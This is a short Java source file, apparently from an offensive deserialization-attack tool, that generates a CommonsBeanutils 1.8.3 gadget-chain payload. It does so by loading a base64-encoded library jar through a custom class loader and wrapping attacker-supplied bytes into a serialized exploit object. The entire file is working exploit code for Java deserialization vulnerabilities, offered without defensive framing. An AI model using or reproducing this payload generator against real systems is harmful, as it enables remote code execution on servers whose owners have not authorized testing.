package com.summersec.attack.deser.payloads;

import com.summersec.attack.deser.util.CommonUtils;
import com.summersec.attack.deser.util.ClassFiles;
import com.summersec.attack.deser.util.SuidClassLoader;
import sun.misc.BASE64Decoder;

import java.io.InputStream;
import java.lang.reflect.Method;

// cb 1.8.3 的利用链
@SuppressWarnings({ "rawtypes", "unchecked" })
public class CommonsBeanutils1_183 {

    public Object getObject(byte[] bytes) throws Exception {
        SuidClassLoader suidClassLoader = new SuidClassLoader();
        suidClassLoader.addClass(CommonsBeanutils1.class.getName(), ClassFiles.classAsBytes(CommonsBeanutils1.class));
        InputStream inputStream = CommonsBeanutils1_183.class.getClassLoader().getResourceAsStream("commons-beanutils-1.8.3.txt");
        byte[] jarBytes = new BASE64Decoder().decodeBuffer(CommonUtils.readStringFromInputStream(inputStream));
        suidClassLoader.addJar(jarBytes);
        Class clsGadget = suidClassLoader.loadClass("payloads.CommonsBeanutils1");
        Object objGadget = clsGadget.newInstance();
        Method getObject = objGadget.getClass().getDeclaredMethod("getObject",byte[].class);
        Object objPayload = getObject.invoke(objGadget,bytes);
        suidClassLoader.cleanLoader();
        return objPayload;
    }

}